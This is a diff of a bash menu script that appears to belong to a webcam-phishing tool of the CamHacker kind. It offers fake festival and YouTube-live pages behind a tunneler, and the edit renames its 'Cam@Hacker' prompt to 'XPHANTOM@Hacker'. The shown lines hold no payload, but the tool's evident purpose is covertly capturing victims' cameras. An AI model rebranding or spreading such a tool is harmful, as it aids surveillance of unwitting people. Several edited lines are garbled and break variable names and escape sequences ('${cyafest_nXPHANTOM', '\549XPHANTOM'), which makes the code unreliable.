@@ -490,7 +490,7 @@ if [ -z $OPTION ]; then
     exit 1
 else
     if [[ $OPTION == true ]]; then
-        printf "${cyan}\nCam${nc}@${cyan}Hacker ${red}$ ${nc}"
+        printf "${cyan}\nXPHANTOM${nc}@${cyan}Hacker ${red}$ ${nc}"
         read option
     else
         option=$OPTION
@@ -502,7 +502,7 @@ fi
         break
     elif echo $option | grep -q "2"; then
         dir="fest"
-        printf "\n${ask}Enter festival name:${cyan}\n\nCam${nc}@${cyan}Hacker ${red}$ ${nc}"
+        printf "\n${ask}Enter festival name:${cyafest_nXPHANTOM${nc}@${cyan}Hacker ${red}$ ${nc}"
         read fest_name
         if [ -z $fest_name ]; then
             echo -e "\n${error}Invalid input!\n\007"
@@ -513,7 +513,7 @@ fi
         fi
     elif echo $option | grep -q "3"; then
         dir="live"
-        printf "\n${ask}Enter youtube video ID:${cyan}\n\nCam${nc}@${cyan}Hacker ${red}$ ${nc}"
+        printf "\n${ask}Enter youtube video ID:${cyan}\n\NXPHANTOM ${nc}@${cyan}Hacker ${red}$ ${nc}"
         read vid_id
         if [ -z $vid_id ]; then
             echo -e "\n${error}Invalid input!\n\007"
@@ -533,7 +533,7 @@ fi
         echo -e "${success}Tunneler switched to ${TN} successfully!\n"
         sleep 2
     elif echo $option | grep -q "p"; then
-        printf "\n${ask}Enter Port:${cyan}\n\nCam${nc}@${cyan}Hacker ${red}$ ${nc}"
+        printf "\n${ask}Enter Port:${cyan}\n\nXPHANTOM${nc}@${cyan}Hacker ${red}$ ${nc}"
         read pore
         if [ ! -z "${pore##*[!0-9]*}" ] ; then
             PORT=$pore;
@@ -544,7 +544,7 @@ fi
             sleep 2
         fi
     elif echo $option | grep -q "d"; then
-        printf "\n${ask}Enter Directory:${cyan}\n\nCam${nc}@${cyan}Hacker ${red}$ ${nc}"
+        printf "\n${ask}Enter Directory:${cyan}\549XPHANTOM${nc}@${cyan}Hacker ${red}$ ${nc}"
         read dire
         if ! [ -d $dire ]; then
             echo -e "\n${error}Invalid directory!\n\007"
